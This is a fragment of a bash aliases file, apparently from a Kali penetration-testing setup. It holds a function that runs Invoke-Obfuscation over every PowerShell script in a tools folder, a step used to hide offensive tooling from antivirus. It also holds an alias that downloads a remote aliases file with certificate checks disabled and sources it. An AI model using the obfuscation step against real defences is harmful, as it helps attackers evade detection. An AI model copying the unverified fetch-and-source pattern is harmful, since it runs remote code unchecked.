        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [ $# -eq 1 ];then
                find . | grep ".ps1" --color=never | grep Tools --color=never | sort | while read SCRIPT_PATH 
                do
                        echo -n "Obfuscating PowerShell Script: $SCRIPT_PATH"
                        pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptPath "$SCRIPT_PATH" -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet" | tee $SCRIPT_PATH.obfs.txt
                done
        else
                echo -e "${RED}psobfuscaterecursively${NC}"
        fi
}

echo -e "${YELLOW}${BOLD}\n==============================${NC}"
echo -e "${YELLOW}${BOLD}[ - ALIASES - ]${NC}"
echo -e "${YELLOW}${BOLD}==============================${NC}"
echo "updatealiases - update .bash_aliases with newest github version"
alias updatealiases='(curl -k -q -L -f "https://raw.githubusercontent.com/michiiii/KALI_vagrant/master/bash_aliases" > ~/.bash_aliases) && source ~/.bash_aliases && echo "Updated aliases..."'

# Set GOPATH
export GOPATH="$HOME/go"

# Add GOPATH/bin to PATH
export PATH="$GOPATH/bin:$PATH"

echo -e "${YELLOW}${BOLD}\n==============================\n${NC}"
